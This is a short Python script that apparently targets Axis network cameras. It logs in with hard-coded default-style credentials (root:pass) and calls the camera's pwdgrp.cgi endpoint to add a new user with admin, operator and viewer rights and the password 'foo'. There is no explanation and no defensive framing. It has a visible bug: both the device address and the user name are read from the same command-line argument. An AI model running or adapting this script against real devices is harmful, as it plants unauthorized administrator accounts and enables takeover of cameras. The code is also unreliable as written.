#!/usr/bin/env python
import requests
import sys

ipaddress = sys.argv[1]
user = sys.argv[1]

# requires authentication
result = requests.get('http://root:pass@%s/axis-cgi/admin/pwdgrp.cgi?action=add&user=%s&'
                      'pwd=foo&grp=axuser&sgrp=axadmin:axoper:axview&comment=CHRIS987651' % (ipaddress,user))

print('CHRIS',result)
